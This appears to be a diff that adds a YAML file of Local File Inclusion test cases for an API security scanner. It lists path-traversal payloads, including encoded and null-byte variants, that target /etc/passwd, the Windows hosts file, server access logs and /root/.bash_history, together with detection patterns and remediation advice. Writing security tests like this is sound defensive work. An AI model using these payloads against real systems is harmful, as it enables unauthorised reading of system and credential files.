@@ -1,0 +1,162 @@
+# LFI - Local File Inclusion Tests
+# Reference: CWE-22, OWASP API4-2023
+
+api_version: "1.0"
+category: LFI
+
+test_cases:
+
+  - id: LFI-001
+    name: Path Traversal - Unix systems
+    severity: HIGH
+    category: LFI
+    cwe_id: CWE-22
+    owasp_ref: API4-2023
+    description: |
+      Test for Local File Inclusion via path traversal on Unix systems.
+    vuln_type: LFI
+    method: GET
+    path: /api/{endpoint}
+    parameters:
+      - name: file
+        type: string
+        location: query
+    payloads:
+      - "../../../etc/passwd"
+      - "..%2F..%2F..%2Fetc%2Fpasswd"
+      - "....//....//....//etc//passwd"
+      - "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+      - "..%252f..%252f..%252fetc%252fpasswd"
+    expected_response:
+      check_pattern: "(root:|bin:|daemon:)"
+    validation:
+      type: file_content
+      indicators:
+        - "root:x:"
+        - "root:"
+        - "/bin/bash"
+    remediation: |
+      Use safe file inclusion APIs.
+      Validate and sanitize file paths.
+      Use allowlists for permitted files.
+
+  - id: LFI-002
+    name: Path Traversal - Windows systems
+    severity: HIGH
+    category: LFI
+    cwe_id: CWE-22
+    description: |
+      Test for Local File Inclusion via path traversal on Windows systems.
+    vuln_type: LFI
+    method: GET
+    path: /api/{endpoint}
+    parameters:
+      - name: file
+        type: string
+        location: query
+    payloads:
+      - "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+      - "..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts"
+      - "....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts"
+      - "..%252f..%252f..%252fwindows%252fsystem32%252fdrivers%252fetc%252fhosts"
+    expected_response:
+      check_pattern: "(localhost|127.0.0.1)"
+    validation:
+      type: file_content
+      indicators:
+        - "localhost"
+        - "127.0.0.1"
+    remediation: |
+      Use safe file APIs.
+      Validate file paths against allowlist.
+      Never use user input directly in file paths.
+
+  - id: LFI-003
+    name: Null byte injection
+    severity: HIGH
+    category: LFI
+    cwe_id: CWE-170
+    description: |
+      Test for Null byte injection to bypass file extension checks.
+    vuln_type: LFI
+    method: GET
+    path: /api/{endpoint}
+    parameters:
+      - name: file
+        type: string
+        location: query
+    payloads:
+      - "../../../etc/passwd%00.txt"
+      - "../../../etc/passwd%00"
+      - "..%00..%00etc/passwd"
+    expected_response:
+      check_pattern: "(root:|bin:)"
+    validation:
+      type: file_content
+      indicators:
+        - "root:"
+    remediation: |
+      Properly handle binary data.
+      Remove null bytes from input.
+      Use secure file handling APIs.
+
+  - id: LFI-004
+    name: Double URL encoding bypass
+    severity: HIGH
+    category: LFI
+    cwe_id: CWE-22
+    description: |
+      Test for double URL encoding to bypass WAF or filters.
+    vuln_type: LFI
+    method: GET
+    path: /api/{endpoint}
+    parameters:
+      - name: file
+        type: string
+        location: query
+    payloads:
+      - "..%252f..%252f..%252fetc%252fpasswd"
+      - "%2e%2e%252f%2e%2e%252f%2e%2e%252fetc%252fpasswd"
+      - "..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"
+    expected_response:
+      check_pattern: "(root:|bin:)"
+    validation:
+      type: file_content
+      indicators:
+        - "root:"
+    remediation: |
+      Decode input multiple times for validation.
+      Use proper path normalization.
+      Implement defense in depth.
+
+  - id: LFI-005
+    name: Log file injection
+    severity: MEDIUM
+    category: LFI
+    cwe_id: CWE-22
+    description: |
+      Test for LFI to access log files and potentially execute code.
+    vuln_type: LFI
+    method: GET
+    path: /api/{endpoint}
+    parameters:
+      - name: file
+        type: string
+        location: query
+    payloads:
+      - "../../../var/log/apache2/access.log"
+      - "../../../var/log/nginx/access.log"
+      - "../../../var/log/httpd/access_log"
+      - "../../../root/.bash_history"
+    expected_response:
+      check_pattern: "(GET|POST|HTTP|apache|nginx)"
+    validation:
+      type: log_file
+      indicators:
+        - "GET /"
+        - "POST /"
+        - "HTTP/1."
+    remediation: |
+      Restrict access to log files.
+      Use proper file permissions.
+      Monitor for suspicious log access.
